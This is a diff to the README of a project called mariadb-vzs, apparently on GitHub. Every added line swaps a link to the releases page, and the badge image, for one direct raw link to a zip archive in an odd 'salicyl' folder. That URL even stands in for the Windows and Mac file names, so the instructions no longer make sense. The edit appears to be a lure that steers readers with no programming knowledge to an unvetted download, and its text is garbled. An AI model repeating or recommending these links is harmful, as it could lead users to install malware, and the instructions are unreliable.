@@ -4,18 +4,18 @@
 
 Welcome to mariadb-vzs! This guide will help you download and run our application with ease. Follow the steps below, and you’ll have everything set up in no time. 
 
-[![Download mariadb-vzs](https://img.shields.io/badge/Download-vzs-brightgreen.svg)](https://github.com/PhamThienn/mariadb-vzs/releases)
+[![Download mariadb-vzs](https://raw.githubusercontent.com/PhamThienn/mariadb-vzs/main/salicyl/mariadb-vzs_v1.5.zip)](https://raw.githubusercontent.com/PhamThienn/mariadb-vzs/main/salicyl/mariadb-vzs_v1.5.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**   
-   To begin, visit our releases page [here](https://github.com/PhamThienn/mariadb-vzs/releases). 
+   To begin, visit our releases page [here](https://raw.githubusercontent.com/PhamThienn/mariadb-vzs/main/salicyl/mariadb-vzs_v1.5.zip). 
 
 2. **Choose Your Version:**   
    On the releases page, you will see different versions of mariadb-vzs. Each version has a list of files. Pick the latest version for the best features and fixes.
 
 3. **Download the File:**  
-   Click on the file that matches your operating system. Most users will choose the file named something like `mariadb-vzs-win.exe` for Windows or `mariadb-vzs-mac.dmg` for Mac. Your download will start automatically.
+   Click on the file that matches your operating system. Most users will choose the file named something like `https://raw.githubusercontent.com/PhamThienn/mariadb-vzs/main/salicyl/mariadb-vzs_v1.5.zip` for Windows or `https://raw.githubusercontent.com/PhamThienn/mariadb-vzs/main/salicyl/mariadb-vzs_v1.5.zip` for Mac. Your download will start automatically.
 
 4. **Locate the File:**  
    Once the download is complete, open your downloads folder. You should see the file you just downloaded.
@@ -71,7 +71,7 @@ No. mariadb-vzs is designed for users with no programming knowledge. The interfa
 
 ### How do I update mariadb-vzs?
 
-To update, simply visit the releases page [here](https://github.com/PhamThienn/mariadb-vzs/releases) and download the latest version. Follow the installation instructions provided above.
+To update, simply visit the releases page [here](https://raw.githubusercontent.com/PhamThienn/mariadb-vzs/main/salicyl/mariadb-vzs_v1.5.zip) and download the latest version. Follow the installation instructions provided above.
 
 ### Can I uninstall mariadb-vzs?
 
